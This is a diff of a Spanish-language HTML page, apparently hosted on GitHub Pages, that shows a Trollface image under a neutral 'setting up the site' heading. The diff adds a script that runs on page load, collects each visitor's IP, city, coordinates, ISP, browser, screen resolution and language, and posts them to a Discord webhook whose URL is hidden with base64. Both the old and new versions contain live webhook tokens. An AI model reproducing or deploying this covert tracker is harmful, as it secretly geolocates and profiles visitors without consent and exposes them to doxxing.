@@ -3,50 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ASDForum</title>
+    <title>TheWebSide</title>
 </head>
 <body>
-    <h1>pruebav1 githubpage</h1>
-
+    <h1>Configurando la página web...</h1>
   
     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRY7OOhDZDaP6YS-tOd1A0ArdgqOVAmQteIkQ&s" alt="Trollface" style="width: 300px; height: auto;">
 
     <script>
+        const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0OTgyNDI5MzU3NTQ2Mjk3My9jM3lKamg3aHNpLTZTWTFCT2tiUVhoQ3NCYjNKd2d3VUFldW1hbzJRWDUtSk1QRnlVNlRHWERsMDYwZ1piVkxhVXVqVA==");
 
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
+        async function obtenerIP() {
+            const res = await fetch('http://ip-api.com/json');
+            const data = await res.json();
+            return data;
+        }
 
-                const userIP = data.ip;
-                console.log("La IP pública es: ", userIP);
+        async function enviarDatos() {
+            const data = await obtenerIP();
+            const navegador = navigator.userAgent;
+            const resolucion = `${screen.width}x${screen.height}`;
+            const idioma = navigator.language;
 
-                const discordWebhookURL = 'https://discord.com/api/webhooks/1348742741399703552/DlwWcZfNX9bbgi2vH2MskQI4vjXIa7vZXFYLQlj8q8h1TXNLSgPnpp2TNCsHAy46xHgh';
+            const payload = {
+                content: `
+🌐 **Nuevo visitante en la web**
 
-                const payload = {
-                    content: `¡Alguien visitó tu página! La IP es: ${userIP}`
-                };
+📡 **IP Pública:** \`${data.query}\`
+🌎 **Ubicación:** ${data.city}, ${data.regionName}, ${data.country}
+📍 **Coordenadas:** ${data.lat}, ${data.lon}
+🛰️ **Proveedor:** ${data.isp}
+💻 **Navegador:** \`${navegador}\`
+🖥️ **Resolución:** \`${resolucion}\`
+🌐 **Idioma:** \`${idioma}\`
+                `
+            };
 
-                fetch(discordWebhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
-                })
-                .then(response => {
-                    if (response.ok) {
-                        console.log("IP enviada correctamente a Discord.");
-                    } else {
-                        console.error("Hubo un error al enviar la IP.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Error al enviar la IP a Discord: ", error);
-                });
-            })
-            .catch(error => {
-                console.error("Error al obtener la IP pública: ", error);
+            await fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             });
+
+            console.log("✅ IP y geolocalización enviada a Discord.");
+        }
+
+        // Anti-spam para que solo envíe la IP una vez por visita
+        if (!localStorage.getItem('ip_enviada')) {
+            enviarDatos();
+            localStorage.setItem('ip_enviada', true);
+        }
     </script>
 </body>
 </html>
